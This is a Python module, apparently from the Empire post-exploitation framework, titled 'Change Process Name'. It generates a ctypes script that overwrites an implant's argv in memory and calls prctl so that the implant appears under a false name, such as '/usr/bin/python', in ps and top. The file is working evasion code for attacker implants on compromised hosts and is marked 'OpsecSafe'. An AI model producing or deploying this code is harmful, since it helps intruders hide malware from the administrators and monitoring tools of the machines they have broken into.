from lib.common import helpers
import pdb

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Change Process Name',

            # list of one or more authors for the module
            'Author': ['calmhavoc','FleiXius'],

            # more verbose multi-line description of the module
            'Description': ("Overwrites process name in memory which changes the process name when viewed with tools such as ps and top"),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessName' : {
                'Description'   :   'New process name for the current implant; 15 character max',
                'Required'      :   True,
                'Value'         :   '/usr/bin/python'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        processName = self.options['ProcessName']['Value']
        script = """
import ctypes
from ctypes.util import find_library
libc = ctypes.CDLL(find_library('c'))
name = '%s'
argv = ctypes.POINTER(ctypes.POINTER(ctypes.c_char))()
argc = ctypes.c_int()
ctypes.pythonapi.Py_GetArgcArgv(ctypes.byref(argc), ctypes.byref(argv))
memset = libc.memset
memset.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_size_t]
memset.restype = ctypes.c_void_p
strlen = libc.strlen
strlen.argtypes = [ctypes.c_void_p]
strlen.restype = ctypes.c_size_t
libc.strncpy(argv[0], name, len(name))
for x in xrange(1, int(argc.value)):
  libc.strncpy(argv[x], ' ' * strlen(argv[x]), strlen(argv[x]))
new_name = ctypes.addressof(argv[0].contents) + len(name)
libc.memset(new_name, 0, strlen(new_name))
libc.prctl(15, ctypes.c_char_p(name), 0, 0, 0)
""" % (processName)


        return script
